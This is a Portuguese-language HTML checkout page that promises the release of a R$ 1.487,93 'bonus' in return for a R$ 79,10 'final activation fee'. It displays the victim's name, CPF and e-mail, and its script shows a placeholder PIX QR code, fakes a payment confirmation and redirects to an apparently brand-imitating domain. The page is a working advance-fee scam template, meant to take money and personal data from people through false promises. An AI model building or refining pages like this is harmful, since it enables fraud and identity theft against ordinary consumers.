<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Resumo Final</title>

<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
body { background-color: #f7f7f7; padding: 20px; display: flex; justify-content: center; }

.container {
    background: #fff;
    width: 100%;
    max-width: 420px;
    border-radius: 15px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    overflow: hidden;
    border: 1px solid #eee;
}

.header { padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f0f0f0; }
.header h1 { font-size: 18px; color: #333; }
.balance-pill { background: #000; color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 14px; font-weight: bold; }

.alert-box { background: #fff5f2; border-left: 4px solid #ee4d2d; margin: 15px; padding: 15px; border-radius: 4px; }
.alert-box h2 { font-size: 20px; color: #333; margin-bottom: 5px; }
.alert-box p { font-size: 13px; color: #666; }

.section-title { font-size: 14px; font-weight: bold; color: #444; margin: 20px 15px 10px; text-transform: uppercase; }

.data-card { background: #f9f9f9; margin: 0 15px; padding: 15px; border-radius: 8px; border: 1px solid #eee; }

.input-group { margin-bottom: 12px; }
.input-group label { font-size: 11px; font-weight: bold; color: #888; display:block; margin-bottom:4px; }
.input-readonly { width: 100%; border: none; background: transparent; font-size: 15px; color: #333; outline: none; }

.values-card { margin: 20px 15px; border-top: 1px solid #eee; padding-top: 15px; }
.value-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; color: #666; }
.value-row.total { margin-top: 15px; padding-top: 10px; border-top: 1px solid #f0f0f0; color: #ee4d2d; font-weight: bold; font-size: 18px; }

.cta-btn {
    width: calc(100% - 30px);
    margin: 20px 15px;
    background: #ee4d2d;
    color: #fff;
    border: none;
    padding: 18px;
    border-radius: 8px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}

#pix_area { display:none; text-align:center; padding:20px; }
#pix_area img { width:200px; margin-bottom:15px; }

#confirmacao {
    display:none;
    text-align:center;
    padding:30px;
    animation: fadeIn 0.5s ease-in-out;
}

.checkmark {
    font-size:60px;
    color:#1f9c6b;
    animation: pop 0.5s ease-in-out;
}

@keyframes pop {
    0%{ transform:scale(0.5); opacity:0; }
    100%{ transform:scale(1); opacity:1; }
}

@keyframes fadeIn {
    from{ opacity:0; }
    to{ opacity:1; }
}
</style>
</head>

<body>

<div class="container">

    <div class="header">
        <h1>Resumo Final</h1>
        <div class="balance-pill">R$ 1.487,93</div>
    </div>

    <div class="alert-box">
        <h2>Consolidação de valores</h2>
        <p>Confirme seus dados abaixo para liberar a sua bonificação instantaneamente.</p>
    </div>

    <div class="section-title">Seus Dados</div>
    <div class="data-card">
        <div class="input-group">
            <label>NOME COMPLETO</label>
            <input type="text" id="nome" class="input-readonly" readonly>
        </div>
        <div class="input-group">
            <label>CPF</label>
            <input type="text" id="cpf" class="input-readonly" readonly>
        </div>
        <div class="input-group">
            <label>E-MAIL</label>
            <input type="text" id="email" class="input-readonly" readonly>
        </div>
    </div>

    <div class="values-card">
        <div class="value-row">
            <span>Taxa de Ativação Final</span>
            <strong>R$ 79,10</strong>
        </div>
        <div class="value-row total">
            <span>VALOR TOTAL LIBERADO</span>
            <strong>R$ 1.487,93</strong>
        </div>
    </div>

    <div id="pix_area">
        <h3 style="color:#1f9c6b;">QR CODE GERADO</h3>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=PIX-TESTE">
        <p>Aguardando pagamento...</p>
    </div>

    <div id="confirmacao">
        <div class="checkmark">✔</div>
        <h2 style="color:#1f9c6b; margin-top:15px;">Pagamento Confirmado</h2>
        <p>Redirecionando...</p>
    </div>

    <button class="cta-btn" id="btn_pagar" onclick="modoTeste()">PROSSEGUIR PARA PAGAMENTO</button>

</div>

<script>

const LINK_REDIRECIONAMENTO = "https://recuperabonushopp.com/elementor-1064";

function modoTeste(){
    document.getElementById("btn_pagar").style.display="none";
    document.getElementById("pix_area").style.display="block";

    // simula pagamento após 5 segundos
    setTimeout(()=>{
        document.getElementById("pix_area").style.display="none";
        document.getElementById("confirmacao").style.display="block";

        setTimeout(()=>{
            window.location.href = LINK_REDIRECIONAMENTO;
        },3000);

    },5000);
}

</script>

</body>
</html>
